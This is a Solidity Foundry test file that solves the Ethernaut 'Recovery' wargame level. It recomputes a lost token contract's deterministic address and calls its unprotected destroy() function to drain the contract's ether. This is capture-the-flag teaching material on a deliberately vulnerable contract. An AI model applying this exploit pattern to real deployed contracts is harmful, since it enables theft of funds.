// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Recovery} from "../src/levels/Recovery.sol";

interface ISimpleToken {
    function destroy(address payable to) external;
}

/// Ethernaut #17 "Recovery" → contract-address recovery technique (no catalog entry). A token created
/// via `Recovery.generateToken` (CREATE) has a *deterministic* address — `keccak(rlp(deployer,
/// nonce))` — even if you "lost" it. Recompute it, then `destroy()` to recover the funds. Win: the
/// lost contract's balance == 0.
contract RecoveryTest is Test {
    function test_solve_recovery() public {
        Recovery lvl = new Recovery();
        lvl.generateToken("lost", 0);

        // first CREATE from `lvl` uses nonce 1
        address token = computeCreateAddress(address(lvl), 1);
        vm.deal(token, 1 ether); // simulate funds sent to the lost token

        ISimpleToken(token).destroy(payable(address(0xdead)));
        assertEq(token.balance, 0, "recovered the ether from the lost contract");
    }
}
